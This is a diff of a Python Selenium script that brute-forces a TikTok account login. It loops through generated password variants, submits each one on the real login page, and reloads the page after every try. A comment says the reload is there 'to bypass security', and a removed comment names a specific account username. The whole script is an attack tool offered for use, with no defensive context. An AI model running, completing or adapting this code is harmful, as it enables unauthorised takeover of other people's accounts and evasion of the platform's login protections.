@@ -1,14 +1,13 @@
-
+#Necessary Imports
 import random
 from selenium import webdriver
 import time
 
 
-#Going to the website
+#Initializing the driver
 driver = webdriver.Chrome()
-# driver.get("https://www.tiktok.com/login/phone-or-email/email")
-# username = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[2]/div/input')
-# password = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[3]/div/input')
+
+
 #Password Generation
 new = ['first']
 letters = ['F', 'f']
@@ -27,7 +26,7 @@ new = list(set(list1))
 print(len(new))
 
 
-#username.send_keys("grrrharubi")
+#Accesing the username and passwords and populating with generated list of passwords then refreshing after ever attempt to bypass security 
 for i in range(len(new)-1):
     driver.get("https://www.tiktok.com/login/phone-or-email/email")
     username = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[2]/div/input')
@@ -37,7 +36,7 @@ for i in range(len(new)-1):
     submit_button = driver.find_elements_by_xpath('//*[@id="root"]/div/div[1]/form/button')[0]
     submit_button.click()
     time.sleep(1)
-    # driver.get("https://www.tiktok.com/login/phone-or-email/email")
+    
 
     
         
